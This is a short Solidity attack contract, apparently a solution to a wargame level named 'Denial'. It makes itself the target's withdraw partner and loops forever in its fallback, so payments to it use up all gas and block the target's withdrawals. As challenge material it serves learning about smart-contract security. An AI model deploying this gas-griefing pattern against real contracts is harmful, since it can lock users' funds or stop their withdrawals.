// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Denial.sol";

contract DenialAttack {
    Denial target;
    constructor(address payable _target) {
        target = Denial(_target);
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while(true){

        }
    }
}